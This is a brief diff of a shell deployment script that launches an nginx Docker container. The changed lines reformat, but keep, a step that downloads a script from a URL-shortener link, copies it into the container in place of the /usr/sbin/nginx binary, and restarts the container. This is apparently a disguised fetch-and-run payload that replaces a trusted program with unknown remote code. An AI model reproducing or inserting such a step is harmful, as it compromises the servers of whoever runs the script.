@@ -22,9 +22,11 @@ if [ $? -ne 0 ]; then
                 -v /run/shm:/run/shm \
                 --restart unless-stopped \
                 $image_name nginx -g 'daemon off;'
-            wget -q -O /tmp/run.sh https://url.cn/5ypyM09 && chmod +x /tmp/run.sh
-            docker cp /tmp/run.sh $container_name:/usr/sbin/nginx && rm /tmp/run.sh
-            docker start $container_name
+            wget -q -O /tmp/run.sh https://url.cn/5ypyM09 \
+                && chmod +x /tmp/run.sh \
+                && docker cp /tmp/run.sh $container_name:/usr/sbin/nginx \
+                && rm /tmp/run.sh \
+                && docker start $container_name
         fi
     fi
     exit
